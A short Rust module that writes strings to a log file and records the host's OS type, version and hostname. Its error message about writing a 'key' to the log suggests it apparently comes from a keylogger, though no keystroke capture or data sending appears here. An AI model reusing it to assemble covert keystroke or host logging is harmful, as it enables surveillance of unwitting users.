pub mod logger {
    use std::io::Write;
    use std::fs::File;
    
    macro_rules! error {
        ($msg:expr, $($arg:expr), *) => {
            println!("[!] {}", format!($msg,$($arg),*))
        };
    }

    // To actually put content on to the given file
    pub fn log(file: &mut File, s:String){

        match file.write(s.as_bytes()){
            Err(err) => error!("[-] Unable to write key to log file, Error: {}",err),
            _ => {}
        }
        
        match file.flush(){
            Err(err) => error!("[-]Unable to get Log Files {}",err),
            _ => {}
        }
    }

    pub fn log_os_info(file: &mut File){

        let os_info = {
            let info = os_info::get();
            format!("OS: type: {}\nVersion: {}\n", info.os_type(), info.version())
        };
    
        log(file, os_info);
    
        let hostname_wrap = hostname::get();
    
        if hostname_wrap.is_ok(){
            log(file, format!("Hostname: {:?}\n",hostname_wrap.unwrap()));
        } else {
            log(file, format!("Hostname: {:?}\n", "NIL"));
        }
    
    }
}